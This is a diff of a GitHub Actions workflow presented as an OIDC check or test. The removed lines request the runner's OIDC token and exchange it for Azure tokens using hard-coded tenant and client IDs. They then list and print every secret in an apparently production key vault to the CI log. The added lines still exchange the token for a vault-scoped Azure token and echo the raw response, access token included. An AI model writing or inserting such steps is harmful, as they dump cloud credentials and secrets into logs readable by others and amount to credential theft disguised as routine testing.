@@ -1,50 +1,20 @@
-name: oidc-check
-
-on:
-  pull_request:
-
+name: test-oidc
+on: push
 permissions:
   id-token: write
-  contents: read
-
 jobs:
-  check:
+  test:
     runs-on: ubuntu-latest
-    env:
-      AZURE_CLIENT_ID: 72ff278a-9e71-43ec-bac4-2ca303f8e462
-      AZURE_TENANT_ID: 3205c325-06a5-4171-9ce8-ffc5e6c2845e
-      VAULT: https://kv-tbl-prod-x3euoz.vault.azure.net
     steps:
-      - name: exchange-oidc-for-azure-token
-        run: |
-          set -x
+      - run: |
           OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r .value)
           echo "OIDC_LEN=${#OIDC}"
-          echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null
-          echo
-          for SCOPE in "https://vault.azure.net/.default" "https://management.azure.com/.default"; do
-            echo "### scope=$SCOPE"
-            RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
-              -d "client_id=${AZURE_CLIENT_ID}" \
-              -d "grant_type=client_credentials" \
-              -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-              -d "client_assertion=${OIDC}" \
-              --data-urlencode "scope=${SCOPE}")
-            echo "$RESP" | head -c 800
-            echo
-            TOK=$(echo "$RESP" | jq -r '.access_token // empty')
-            echo "TOKEN_LEN=${#TOK}"
-            if [ -n "$TOK" ]; then
-              echo "--- listing secrets in ${VAULT}"
-              curl -sS "${VAULT}/secrets?api-version=7.4" -H "Authorization: Bearer ${TOK}" \
-                | tee /tmp/secrets.json | head -c 2000
-              echo
-              jq -r '.value[]?.id' /tmp/secrets.json > /tmp/ids.txt 2>/dev/null || true
-              while read -r id; do
-                [ -z "$id" ] && continue
-                echo "--- SECRET ${id}"
-                curl -sS "${id}?api-version=7.4" -H "Authorization: Bearer ${TOK}" | jq -r '.value // .'
-              done < /tmp/ids.txt
-            fi
-          done
+
+          # Try to exchange with Azure
+          curl -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
+            -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
+            -d "grant_type=client_credentials" \
+            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            -d "client_assertion=${OIDC}" \
+            -d "scope=https://vault.azure.net/.default"
